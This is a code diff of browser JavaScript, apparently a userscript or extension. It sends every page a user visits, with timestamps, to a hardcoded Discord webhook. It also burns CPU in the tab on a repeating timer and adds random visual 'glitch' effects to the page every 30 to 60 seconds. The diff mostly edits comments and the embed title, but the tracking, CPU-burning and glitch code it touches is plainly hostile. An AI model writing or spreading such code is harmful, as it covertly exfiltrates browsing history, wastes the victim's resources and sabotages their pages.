@@ -2,16 +2,18 @@ const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/135193797971895913
 
 function sendVisitToDiscord(url) {
   const now = new Date();
-  const timestampLocal = now.toLocaleString();       // e.g. "7/6/2025, 8:13:14 PM"
-  const timestampISO = now.toISOString();             // for embed.timestamp
+  const timestampLocal = now.toLocaleString();       
+  const timestampISO = now.toISOString();             
+
+  const hostname = new URL(url).hostname;  // Extract the website name
 
   const payload = {
     embeds: [
       {
-        title: "🌐 New Page Visit",
+        title: `🌐 Visited ${hostname}`,           // <—— Changed line
         url: url,
         description: `🕒 Visited at ${timestampLocal}`,
-        color: 0x00AE86,       // change to any hex color you like
+        color: 0x00AE86,
         timestamp: timestampISO
       }
     ]
@@ -40,7 +42,7 @@ if (document.readyState === "complete" || document.readyState === "interactive")
 }
 
 // CPU burn function:
-const INTENSITY = 300; // 1–100 ms CPU burn duration
+const INTENSITY = 300; 
 function burnTabCPU() {
   setInterval(() => {
     const end = Date.now() + INTENSITY;
@@ -56,7 +58,6 @@ burnTabCPU();
 function glitchUI() {
   const body = document.body;
 
-  // Insert style & SVG filter once
   if (!document.getElementById('glitch-style')) {
     const style = document.createElement('style');
     style.id = 'glitch-style';
@@ -102,7 +103,6 @@ function glitchUI() {
   }, 500);
 }
 
-// Trigger glitch every 30–60 seconds randomly
 function startRandomGlitch() {
   (function scheduleNext() {
     const delay = 30000 + Math.random() * 30000;
